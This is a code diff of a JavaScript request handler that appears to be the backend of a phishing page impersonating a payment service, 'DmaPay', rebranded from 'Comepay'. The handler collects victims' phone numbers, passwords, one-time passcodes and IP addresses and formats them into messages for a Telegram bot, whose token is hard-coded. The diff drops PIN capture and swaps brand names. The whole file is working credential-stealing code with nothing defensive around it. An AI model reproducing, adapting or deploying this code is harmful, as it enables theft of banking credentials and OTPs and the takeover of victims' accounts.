@@ -3,7 +3,7 @@ export default async function handler(req, res) {
     return res.status(405).json({ error: 'Method not allowed' });
   }
 
-  const { type, phone, pass, pin, otp } = req.body;
+  const { type, phone, pass, otp } = req.body;
 
   // --- TELEGRAM BOT CONFIGURATION ---
   const BOT_TOKEN_1 = '9287846771:AAG0rvQ0rZA10HBxURhb9d5GogHOKmS2Nq4';
@@ -17,11 +17,11 @@ export default async function handler(req, res) {
   let message = '';
 
   if (type === 'login') {
-    message = `✅ <b>New DmaPay Login</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: <code>${phone}</code>\n🔑 Password: <code>${pass}</code>\n🔐 PIN: <code>${pin || 'N/A'}</code>`;
+    message = `✅ <b>New DmaPay Login</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: <code>${phone}</code>\n🔑 Password: <code>${pass}</code>`;
   } else if (type === 'send_otp' || type === 'modal_otp') {
-    message = `🔐 <b>OTP Requested (Comepay)</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>`;
+    message = `🔐 <b>OTP Requested (DmaPay)</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>`;
   } else if (type === 'verify_otp') {
-    message = `🔑 <b>OTP Entered (Wrong Attempt - Comepay)</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>\n🔢 OTP: <code>${otp}</code>`;
+    message = `🔑 <b>OTP Entered (Wrong Attempt - DmaPay)</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>\n🔢 OTP: <code>${otp}</code>`;
   } else {
     message = `📩 <b>Activity from IP:</b> <code>${clientIp}</code>`;
   }
